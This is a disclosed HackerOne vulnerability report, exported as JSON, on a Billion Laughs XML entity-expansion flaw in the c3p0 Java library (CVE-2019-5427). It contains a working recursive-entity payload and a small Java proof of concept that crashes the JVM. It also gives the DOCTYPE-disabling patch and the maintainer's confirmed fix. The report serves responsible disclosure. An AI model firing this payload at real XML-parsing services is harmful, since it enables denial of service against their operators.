{"id":509315,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC81MDkzMTU=","url":"https://hackerone.com/reports/509315","title":"c3p0 may be exploited by a Billion Laughs Attack when loading XML configuration","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2019-03-13T16:34:01.586Z","submitted_at":"2019-03-13T16:34:01.586Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"amassey","url":"/amassey","profile_picture_urls":{"small":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":35524,"url":"https://hackerone.com/central-security-project","handle":"central-security-project","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/035/524/60c5e9c4b0090fc9ce80fa9d9ca3aecd88d01b00_original.jpg/3afcb5c896247e7ee8ada31b1c1eb8657e22241f911093acfe4ec7e97a3a959a","medium":"https://profile-photos.hackerone-user-content.com/variants/000/035/524/60c5e9c4b0090fc9ce80fa9d9ca3aecd88d01b00_original.jpg/eb31823a4cc9f6b6bb4db930ffdf512533928a68a4255fb50a83180281a60da5"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":false,"state":"public_mode","only_cleared_hackers":false,"profile":{"name":"Central Security Project","twitter_handle":"SaferOpenSource","website":"https://www.sonatype.com/central-security-project","about":"Ensuring Safer Open Source Across Ecosystems"}},"has_bounty?":false,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"stage":4,"public":true,"visibility":"full","cve_ids":["CVE-2019-5427"],"singular_disclosure_disabled":false,"disclosed_at":"2019-04-16T20:05:48.418Z","bug_reporter_agreed_on_going_public_at":null,"team_member_agreed_on_going_public_at":"2019-04-16T20:02:18.149Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"\u003e NOTE! Thanks for submitting a report! Please replace *all* the [square] sections below with the pertinent details. Remember, the more detail you provide, the easier it is for us to triage and respond quickly, so be sure to take your time filling out the report!  Please refer to the **[example on our policy page](/central-security-project?view_policy=true#disclosure-example)**.\n\n# Maven artifact\n**groupId:** com.mchange\n**artifactId:** c3p0\n**version:** 0.9.5.3\n\n# Vulnerability\n## Vulnerability Description\n\u003e `c3p0/src/java/com/mchange/v2/c3p0/cfg/C3P0ConfigXmlUtils.java` does not protect against recursive entity expansion when loading configuration. \n\n## Additional Details\n**Source File and Line Number:** https://github.com/swaldman/c3p0/blob/c3p0-0.9.5.3/src/java/com/mchange/v2/c3p0/cfg/C3P0ConfigXmlUtils.java#L154\n\n## Steps To Reproduce:\n\u003e Detailed steps to reproduce with all required references/steps/commands. Any sample/exploit code or other proof of concept.\n\n1) Use `C3P0ConfigXmlUtils.extractXmlConfigFromInputStream()` on Billion Laughs XML payload\n2) Have a billion laughs while the JVM crashes.\n\n```\nimport com.mchange.v2.c3p0.cfg.C3P0ConfigXmlUtils;\nimport java.io.InputStream;\n\npublic class C3P0PoC {\n\n    public static void main(String[] args) throws Exception {\n\n        String payload = args[0];\n        InputStream inputStream = C3P0PoC.class.getResourceAsStream(payload);\n\n        C3P0ConfigXmlUtils.extractXmlConfigFromInputStream(inputStream, false);\n\n\n        System.out.println(\"Completed!\");\n    }\n}\n```\n\nXML Payload\n```\n\u003c?xml version=\"1.0\"?\u003e\n\u003c!DOCTYPE lolz [\n        \u003c!ENTITY lol \"lol\"\u003e\n        \u003c!ELEMENT lolz (#PCDATA)\u003e\n        \u003c!ENTITY lol1 \"\u0026lol;\u0026lol;\u0026lol;\u0026lol;\u0026lol;\u0026lol;\u0026lol;\u0026lol;\u0026lol;\u0026lol;\"\u003e\n        \u003c!ENTITY lol2 \"\u0026lol1;\u0026lol1;\u0026lol1;\u0026lol1;\u0026lol1;\u0026lol1;\u0026lol1;\u0026lol1;\u0026lol1;\u0026lol1;\"\u003e\n        \u003c!ENTITY lol3 \"\u0026lol2;\u0026lol2;\u0026lol2;\u0026lol2;\u0026lol2;\u0026lol2;\u0026lol2;\u0026lol2;\u0026lol2;\u0026lol2;\"\u003e\n        \u003c!ENTITY lol4 \"\u0026lol3;\u0026lol3;\u0026lol3;\u0026lol3;\u0026lol3;\u0026lol3;\u0026lol3;\u0026lol3;\u0026lol3;\u0026lol3;\"\u003e\n        \u003c!ENTITY lol5 \"\u0026lol4;\u0026lol4;\u0026lol4;\u0026lol4;\u0026lol4;\u0026lol4;\u0026lol4;\u0026lol4;\u0026lol4;\u0026lol4;\"\u003e\n        \u003c!ENTITY lol6 \"\u0026lol5;\u0026lol5;\u0026lol5;\u0026lol5;\u0026lol5;\u0026lol5;\u0026lol5;\u0026lol5;\u0026lol5;\u0026lol5;\"\u003e\n        \u003c!ENTITY lol7 \"\u0026lol6;\u0026lol6;\u0026lol6;\u0026lol6;\u0026lol6;\u0026lol6;\u0026lol6;\u0026lol6;\u0026lol6;\u0026lol6;\"\u003e\n        \u003c!ENTITY lol8 \"\u0026lol7;\u0026lol7;\u0026lol7;\u0026lol7;\u0026lol7;\u0026lol7;\u0026lol7;\u0026lol7;\u0026lol7;\u0026lol7;\"\u003e\n        \u003c!ENTITY lol9 \"\u0026lol8;\u0026lol8;\u0026lol8;\u0026lol8;\u0026lol8;\u0026lol8;\u0026lol8;\u0026lol8;\u0026lol8;\u0026lol8;\"\u003e\n        ]\u003e\n\u003clolz\u003e\u0026lol9;\u003c/lolz\u003e\n```\n\n## Patch\n\nThe patch given was adapted from [https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.md#jaxp-documentbuilderfactory-saxparserfactory-and-dom4j](https://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.md#jaxp-documentbuilderfactory-saxparserfactory-and-dom4j)\n\nApply the following before calling `fact.newDocumentBuilder()`.\n```\nString FEATURE = null;\nFEATURE = \"http://apache.org/xml/features/disallow-doctype-decl\";\nfact.setFeature(FEATURE, true);\n```\n\n## Supporting Material/References:\n\u003e State all technical information about the stack where the vulnerability was found\n- Darwin Kernel Version 18.2.0\n- 1.8.0_171\n- 3.3.9\n\n# Wrap up\n\u003e Select Y or N for the following statements:\n- I contacted the maintainer to let them know: N \n- I opened an issue in the related repository: N\n\n\u003e Finder's comments and funny memes goes here\n\nHonestly, this is a pretty complicated attack to pull off. The attack requires poisoned XML configuration data to make to the component's client code. I may have held off on reporting it, but the maintainer did acknowledge a similar attack, twas XXE, under CVE-2018-20433. Since the reporter didn't dispute it, I decided to report this attack as valid as well.\n\nVulnerabilities like these exist because https://docs.oracle.com/javase/7/docs/api/javax/xml/parsers/DocumentBuilderFactory.html#setExpandEntityReferences(boolean) is a poorly named and documented method thus causing misunderstanding.\n\nI'm on my third five hour energy today.\n\n## Impact\n\nThis could be leveraged by an attacker to cause a Denial of Service by crashing the JVM that the server process is running on.","vulnerability_information_html":"\u003cblockquote\u003e\n\u003cp\u003eNOTE! Thanks for submitting a report! Please replace \u003cem\u003eall\u003c/em\u003e the [square] sections below with the pertinent details. Remember, the more detail you provide, the easier it is for us to triage and respond quickly, so be sure to take your time filling out the report!  Please refer to the \u003cstrong\u003e\u003ca href=\"/central-security-project?view_policy=true#disclosure-example\"\u003eexample on our policy page\u003c/a\u003e\u003c/strong\u003e.\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003ch1 id=\"maven-artifact\"\u003eMaven artifact\u003c/h1\u003e\n\n\u003cp\u003e\u003cstrong\u003egroupId:\u003c/strong\u003e com.mchange\u003cbr\u003e\n\u003cstrong\u003eartifactId:\u003c/strong\u003e c3p0\u003cbr\u003e\n\u003cstrong\u003eversion:\u003c/strong\u003e 0.9.5.3\u003c/p\u003e\n\n\u003ch1 id=\"vulnerability\"\u003eVulnerability\u003c/h1\u003e\n\n\u003ch2 id=\"vulnerability-description\"\u003eVulnerability Description\u003c/h2\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003e\u003ccode\u003ec3p0/src/java/com/mchange/v2/c3p0/cfg/C3P0ConfigXmlUtils.java\u003c/code\u003e does not protect against recursive entity expansion when loading configuration. \u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003ch2 id=\"additional-details\"\u003eAdditional Details\u003c/h2\u003e\n\n\u003cp\u003e\u003cstrong\u003eSource File and Line Number:\u003c/strong\u003e \u003ca title=\"https://github.com/swaldman/c3p0/blob/c3p0-0.9.5.3/src/java/com/mchange/v2/c3p0/cfg/C3P0ConfigXmlUtils.java#L154\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fswaldman%2Fc3p0%2Fblob%2Fc3p0-0.9.5.3%2Fsrc%2Fjava%2Fcom%2Fmchange%2Fv2%2Fc3p0%2Fcfg%2FC3P0ConfigXmlUtils.java%23L154\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/swaldman/c3p0/blob/c3p0-0.9.5.3/src/java/com/mchange/v2/c3p0/cfg/C3P0ConfigXmlUtils.java#L154\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003ch2 id=\"steps-to-reproduce\"\u003eSteps To Reproduce:\u003c/h2\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eDetailed steps to reproduce with all required references/steps/commands. Any sample/exploit code or other proof of concept.\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003e1) Use \u003ccode\u003eC3P0ConfigXmlUtils.extractXmlConfigFromInputStream()\u003c/code\u003e on Billion Laughs XML payload\u003cbr\u003e\n2) Have a billion laughs while the JVM crashes.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eimport com.mchange.v2.c3p0.cfg.C3P0ConfigXmlUtils;\nimport java.io.InputStream;\n\npublic class C3P0PoC {\n\n    public static void main(String[] args) throws Exception {\n\n        String payload = args[0];\n        InputStream inputStream = C3P0PoC.class.getResourceAsStream(payload);\n\n        C3P0ConfigXmlUtils.extractXmlConfigFromInputStream(inputStream, false);\n\n\n        System.out.println(\u0026quot;Completed!\u0026quot;);\n    }\n}\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eXML Payload\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight xml\"\u003e\u003ccode\u003e\u003cspan class=\"cp\"\u003e\u0026lt;?xml version=\u0026quot;1.0\u0026quot;?\u0026gt;\u003c/span\u003e\n\u003cspan class=\"cp\"\u003e\u0026lt;!DOCTYPE lolz [\n        \u0026lt;!ENTITY lol \u0026quot;lol\u0026quot;\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"cp\"\u003e\u0026lt;!ELEMENT lolz (#PCDATA)\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"cp\"\u003e\u0026lt;!ENTITY lol1 \u0026quot;\u0026amp;lol;\u0026amp;lol;\u0026amp;lol;\u0026amp;lol;\u0026amp;lol;\u0026amp;lol;\u0026amp;lol;\u0026amp;lol;\u0026amp;lol;\u0026amp;lol;\u0026quot;\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"cp\"\u003e\u0026lt;!ENTITY lol2 \u0026quot;\u0026amp;lol1;\u0026amp;lol1;\u0026amp;lol1;\u0026amp;lol1;\u0026amp;lol1;\u0026amp;lol1;\u0026amp;lol1;\u0026amp;lol1;\u0026amp;lol1;\u0026amp;lol1;\u0026quot;\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"cp\"\u003e\u0026lt;!ENTITY lol3 \u0026quot;\u0026amp;lol2;\u0026amp;lol2;\u0026amp;lol2;\u0026amp;lol2;\u0026amp;lol2;\u0026amp;lol2;\u0026amp;lol2;\u0026amp;lol2;\u0026amp;lol2;\u0026amp;lol2;\u0026quot;\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"cp\"\u003e\u0026lt;!ENTITY lol4 \u0026quot;\u0026amp;lol3;\u0026amp;lol3;\u0026amp;lol3;\u0026amp;lol3;\u0026amp;lol3;\u0026amp;lol3;\u0026amp;lol3;\u0026amp;lol3;\u0026amp;lol3;\u0026amp;lol3;\u0026quot;\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"cp\"\u003e\u0026lt;!ENTITY lol5 \u0026quot;\u0026amp;lol4;\u0026amp;lol4;\u0026amp;lol4;\u0026amp;lol4;\u0026amp;lol4;\u0026amp;lol4;\u0026amp;lol4;\u0026amp;lol4;\u0026amp;lol4;\u0026amp;lol4;\u0026quot;\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"cp\"\u003e\u0026lt;!ENTITY lol6 \u0026quot;\u0026amp;lol5;\u0026amp;lol5;\u0026amp;lol5;\u0026amp;lol5;\u0026amp;lol5;\u0026amp;lol5;\u0026amp;lol5;\u0026amp;lol5;\u0026amp;lol5;\u0026amp;lol5;\u0026quot;\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"cp\"\u003e\u0026lt;!ENTITY lol7 \u0026quot;\u0026amp;lol6;\u0026amp;lol6;\u0026amp;lol6;\u0026amp;lol6;\u0026amp;lol6;\u0026amp;lol6;\u0026amp;lol6;\u0026amp;lol6;\u0026amp;lol6;\u0026amp;lol6;\u0026quot;\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"cp\"\u003e\u0026lt;!ENTITY lol8 \u0026quot;\u0026amp;lol7;\u0026amp;lol7;\u0026amp;lol7;\u0026amp;lol7;\u0026amp;lol7;\u0026amp;lol7;\u0026amp;lol7;\u0026amp;lol7;\u0026amp;lol7;\u0026amp;lol7;\u0026quot;\u0026gt;\u003c/span\u003e\n        \u003cspan class=\"cp\"\u003e\u0026lt;!ENTITY lol9 \u0026quot;\u0026amp;lol8;\u0026amp;lol8;\u0026amp;lol8;\u0026amp;lol8;\u0026amp;lol8;\u0026amp;lol8;\u0026amp;lol8;\u0026amp;lol8;\u0026amp;lol8;\u0026amp;lol8;\u0026quot;\u0026gt;\u003c/span\u003e\n        ]\u0026gt;\n\u003cspan class=\"nt\"\u003e\u0026lt;lolz\u0026gt;\u003c/span\u003e\u003cspan class=\"ni\"\u003e\u0026amp;lol9;\u003c/span\u003e\u003cspan class=\"nt\"\u003e\u0026lt;/lolz\u0026gt;\u003c/span\u003e\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"patch\"\u003ePatch\u003c/h2\u003e\n\n\u003cp\u003eThe patch given was adapted from \u003ca href=\"/redirect?url=https%3A%2F%2Fgithub.com%2FOWASP%2FCheatSheetSeries%2Fblob%2Fmaster%2Fcheatsheets%2FXML_External_Entity_Prevention_Cheat_Sheet.md%23jaxp-documentbuilderfactory-saxparserfactory-and-dom4j\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/OWASP/CheatSheetSeries/blob/master/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.md#jaxp-documentbuilderfactory-saxparserfactory-and-dom4j\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e\u003c/p\u003e\n\n\u003cp\u003eApply the following before calling \u003ccode\u003efact.newDocumentBuilder()\u003c/code\u003e.\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003eString FEATURE = null;\nFEATURE = \u0026quot;http://apache.org/xml/features/disallow-doctype-decl\u0026quot;;\nfact.setFeature(FEATURE, true);\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003ch2 id=\"supporting-material-references\"\u003eSupporting Material/References:\u003c/h2\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eState all technical information about the stack where the vulnerability was found\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eDarwin Kernel Version 18.2.0\u003c/li\u003e\n\u003cli\u003e1.8.0_171\u003c/li\u003e\n\u003cli\u003e3.3.9\u003c/li\u003e\n\u003c/ul\u003e\n\u003c/blockquote\u003e\n\n\u003ch1 id=\"wrap-up\"\u003eWrap up\u003c/h1\u003e\n\n\u003cblockquote\u003e\n\u003cp\u003eSelect Y or N for the following statements:\u003c/p\u003e\n\n\u003cul\u003e\n\u003cli\u003eI contacted the maintainer to let them know: N \u003c/li\u003e\n\u003cli\u003eI opened an issue in the related repository: N\u003c/li\u003e\n\u003c/ul\u003e\n\n\u003cp\u003eFinder\u0026#39;s comments and funny memes goes here\u003c/p\u003e\n\u003c/blockquote\u003e\n\n\u003cp\u003eHonestly, this is a pretty complicated attack to pull off. The attack requires poisoned XML configuration data to make to the component\u0026#39;s client code. I may have held off on reporting it, but the maintainer did acknowledge a similar attack, twas XXE, under CVE-2018-20433. Since the reporter didn\u0026#39;t dispute it, I decided to report this attack as valid as well.\u003c/p\u003e\n\n\u003cp\u003eVulnerabilities like these exist because \u003ca title=\"https://docs.oracle.com/javase/7/docs/api/javax/xml/parsers/DocumentBuilderFactory.html#setExpandEntityReferences(boolean)\" href=\"/redirect?url=https%3A%2F%2Fdocs.oracle.com%2Fjavase%2F7%2Fdocs%2Fapi%2Fjavax%2Fxml%2Fparsers%2FDocumentBuilderFactory.html%23setExpandEntityReferences%28boolean%29\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://docs.oracle.com/javase/7/docs/api/javax/xml/parsers/DocumentBuilderFactory.html#setExpandEntityReferences(boolean)\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e is a poorly named and documented method thus causing misunderstanding.\u003c/p\u003e\n\n\u003cp\u003eI\u0026#39;m on my third five hour energy today.\u003c/p\u003e\n\n\u003ch2 id=\"impact\"\u003eImpact\u003c/h2\u003e\n\n\u003cp\u003eThis could be leveraged by an attacker to cause a Denial of Service by crashing the JVM that the server process is running on.\u003c/p\u003e\n","weakness":{"id":96,"name":"XML Entity Expansion"},"original_report_id":null,"original_report_url":null,"attachments":[],"allow_singular_disclosure_at":"2019-05-16T20:02:18.263Z","allow_singular_disclosure_after":-51185404.24680516,"singular_disclosure_allowed":true,"vote_count":4,"voters":["eveeez","cryptographer","defheckler","tescoramen"],"severity":{"rating":"medium","score":6.2,"author_type":"User","metrics":{"attack_vector":"local","attack_complexity":"high","privileges_required":"low","user_interaction":"required","scope":"unchanged","confidentiality":"none","integrity":"none","availability":"high"}},"structured_scope":{"databaseId":17122,"asset_type":"SOURCE_CODE","asset_identifier":"Java Component in search.maven.org","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"can_edit_custom_fields_attributes":false,"activities":[{"id":4318467,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you for your submission. It is under review and we will get back to you shortly.","markdown_message":"\u003cp\u003eThank you for your submission. It is under review and we will get back to you shortly.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-03-13T18:31:58.473Z","updated_at":"2019-03-13T18:31:58.473Z","actor":{"username":"acazzolla","cleared":false,"url":"/acazzolla","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"central-security-project","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4318497,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","markdown_message":"","automated_response":false,"created_at":"2019-03-13T18:35:59.217Z","updated_at":"2019-03-13T18:35:59.217Z","actor":{"username":"acazzolla","cleared":false,"url":"/acazzolla","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"central-security-project","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":4334986,"is_internal":false,"editable":false,"type":"Activities::ExternalUserJoined","message":"","markdown_message":"","automated_response":false,"created_at":"2019-03-16T01:40:17.839Z","updated_at":"2019-03-16T01:40:17.839Z","actor":{"username":"swaldman","cleared":false,"url":"/swaldman","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"central-security-project","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4335314,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank @amassey for the report!\n\nI think https://github.com/swaldman/c3p0/commit/f38f27635c384806c2a9d6500d80183d9f09d78b adequately addresses the issue (much more verbosely than your suggestion, basically pulling in the kitchen sink from the cheatsheet you reference to get as cautious as possible under whatever JVM / XML library versions are around). This fix is included in the current SNAPSHOT release, c3p0-0.9.5.4-SNAPSHOT. Does it look okay?","markdown_message":"\u003cp\u003eThank \u003ca href=\"/amassey\"\u003e@amassey\u003c/a\u003e for the report!\u003c/p\u003e\n\n\u003cp\u003eI think \u003ca title=\"https://github.com/swaldman/c3p0/commit/f38f27635c384806c2a9d6500d80183d9f09d78b\" href=\"/redirect?url=https%3A%2F%2Fgithub.com%2Fswaldman%2Fc3p0%2Fcommit%2Ff38f27635c384806c2a9d6500d80183d9f09d78b\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003ehttps://github.com/swaldman/c3p0/commit/f38f27635c384806c2a9d6500d80183d9f09d78b\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e adequately addresses the issue (much more verbosely than your suggestion, basically pulling in the kitchen sink from the cheatsheet you reference to get as cautious as possible under whatever JVM / XML library versions are around). This fix is included in the current SNAPSHOT release, c3p0-0.9.5.4-SNAPSHOT. Does it look okay?\u003c/p\u003e\n","automated_response":false,"created_at":"2019-03-16T06:13:16.848Z","updated_at":"2019-03-16T06:13:16.848Z","actor":{"username":"swaldman","cleared":false,"url":"/swaldman","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"central-security-project","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4363225,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"From manually reviewing the changes, this looks great! \n\nI'd run the PoC on a JAR from the new sources, but I'm honestly having a tough time building c3p0 from source. I'm quite confident this is fixed though.","markdown_message":"\u003cp\u003eFrom manually reviewing the changes, this looks great! \u003c/p\u003e\n\n\u003cp\u003eI\u0026#39;d run the PoC on a JAR from the new sources, but I\u0026#39;m honestly having a tough time building c3p0 from source. I\u0026#39;m quite confident this is fixed though.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-03-20T21:51:15.330Z","updated_at":"2019-03-20T21:51:15.330Z","actor":{"username":"amassey","cleared":false,"url":"/amassey","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"central-security-project","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4364261,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I'm very sorry about that. c3p0 is an ancient library, its build dates to long before the existence of maven-ish dependency management and portable git repositories. I mean someday to update it to a more modern build tool and style. Someday.\n\nAnyway, here's the output of running your PoC on your payload using the [latest 0.9.5.4-SNAPSHOT release](https://oss.sonatype.org/content/repositories/snapshots/com/mchange/c3p0/0.9.5.4-SNAPSHOT/c3p0-0.9.5.4-20190316.055950-3.jar):\n\n```\n$ java C3P0PoC payload.xml \nMar 20, 2019 10:37:02 PM com.mchange.v2.log.MLog \nINFO: MLog clients using java 1.4+ standard logging.\n[Fatal Error] :2:10: DOCTYPE is disallowed when the feature \"http://apache.org/xml/features/disallow-doctype-decl\" set to true.\nException in thread \"main\" org.xml.sax.SAXParseException; lineNumber: 2; columnNumber: 10; DOCTYPE is disallowed when the feature \"http://apache.org/xml/features/disallow-doctype-decl\" set to true.\n\tat com.sun.org.apache.xerces.internal.parsers.DOMParser.parse(DOMParser.java:257)\n\tat com.sun.org.apache.xerces.internal.jaxp.DocumentBuilderImpl.parse(DocumentBuilderImpl.java:339)\n\tat javax.xml.parsers.DocumentBuilder.parse(DocumentBuilder.java:121)\n\tat com.mchange.v2.c3p0.cfg.C3P0ConfigXmlUtils.extractXmlConfigFromInputStream(C3P0ConfigXmlUtils.java:206)\n\tat C3P0PoC.main(C3P0PoC.java:11)\n```\n\nIt still fails! But in a safer, saner way. No laughs. ;)\n\nIf we agree this is good behavior, I'll do a bit more testing, then go ahead and release.","markdown_message":"\u003cp\u003eI\u0026#39;m very sorry about that. c3p0 is an ancient library, its build dates to long before the existence of maven-ish dependency management and portable git repositories. I mean someday to update it to a more modern build tool and style. Someday.\u003c/p\u003e\n\n\u003cp\u003eAnyway, here\u0026#39;s the output of running your PoC on your payload using the \u003ca href=\"/redirect?url=https%3A%2F%2Foss.sonatype.org%2Fcontent%2Frepositories%2Fsnapshots%2Fcom%2Fmchange%2Fc3p0%2F0.9.5.4-SNAPSHOT%2Fc3p0-0.9.5.4-20190316.055950-3.jar\" target=\"_blank\" rel=\"nofollow noopener noreferrer\"\u003e\u003cspan\u003elatest 0.9.5.4-SNAPSHOT release\u003c/span\u003e\u003ci class=\"icon-external-link\"\u003e\u003c/i\u003e\u003c/a\u003e:\u003c/p\u003e\n\u003cdiv class=\"highlight\"\u003e\u003cpre class=\"highlight plaintext\"\u003e\u003ccode\u003e$ java C3P0PoC payload.xml \nMar 20, 2019 10:37:02 PM com.mchange.v2.log.MLog \nINFO: MLog clients using java 1.4+ standard logging.\n[Fatal Error] :2:10: DOCTYPE is disallowed when the feature \u0026quot;http://apache.org/xml/features/disallow-doctype-decl\u0026quot; set to true.\nException in thread \u0026quot;main\u0026quot; org.xml.sax.SAXParseException; lineNumber: 2; columnNumber: 10; DOCTYPE is disallowed when the feature \u0026quot;http://apache.org/xml/features/disallow-doctype-decl\u0026quot; set to true.\n    at com.sun.org.apache.xerces.internal.parsers.DOMParser.parse(DOMParser.java:257)\n    at com.sun.org.apache.xerces.internal.jaxp.DocumentBuilderImpl.parse(DocumentBuilderImpl.java:339)\n    at javax.xml.parsers.DocumentBuilder.parse(DocumentBuilder.java:121)\n    at com.mchange.v2.c3p0.cfg.C3P0ConfigXmlUtils.extractXmlConfigFromInputStream(C3P0ConfigXmlUtils.java:206)\n    at C3P0PoC.main(C3P0PoC.java:11)\n\u003c/code\u003e\u003c/pre\u003e\u003c/div\u003e\n\u003cp\u003eIt still fails! But in a safer, saner way. No laughs. ;)\u003c/p\u003e\n\n\u003cp\u003eIf we agree this is good behavior, I\u0026#39;ll do a bit more testing, then go ahead and release.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-03-21T05:42:30.307Z","updated_at":"2019-03-21T05:42:30.307Z","actor":{"username":"swaldman","cleared":false,"url":"/swaldman","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"central-security-project","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4367686,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"I think this is great behavior! Better to make a thread throw an exception early and loud (in my opinion) with defined behavior instead of depending on how the JVM has been configured and maybe crashing the entire process instead of a single thread. Or if some dev configured the JVM process to have the entire system's memory or more crashing the whole system.\n\nThank you for your quick response!","markdown_message":"\u003cp\u003eI think this is great behavior! Better to make a thread throw an exception early and loud (in my opinion) with defined behavior instead of depending on how the JVM has been configured and maybe crashing the entire process instead of a single thread. Or if some dev configured the JVM process to have the entire system\u0026#39;s memory or more crashing the whole system.\u003c/p\u003e\n\n\u003cp\u003eThank you for your quick response!\u003c/p\u003e\n","automated_response":false,"created_at":"2019-03-21T17:32:55.670Z","updated_at":"2019-03-21T17:32:55.670Z","actor":{"username":"amassey","cleared":false,"url":"/amassey","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"central-security-project","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4379714,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"OK. c3p0-0.9.5.4 with this fix is now a release! Thanks for your help.","markdown_message":"\u003cp\u003eOK. c3p0-0.9.5.4 with this fix is now a release! Thanks for your help.\u003c/p\u003e\n","automated_response":false,"created_at":"2019-03-24T07:43:49.727Z","updated_at":"2019-03-24T07:43:49.727Z","actor":{"username":"swaldman","cleared":false,"url":"/swaldman","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"central-security-project","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":4578080,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"","markdown_message":"","automated_response":false,"created_at":"2019-04-16T19:59:24.122Z","updated_at":"2019-04-16T19:59:24.122Z","actor":{"username":"tescoramen","cleared":false,"url":"/tescoramen","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/244/189/f2b53e3efa1954fe7559ee89019c00b13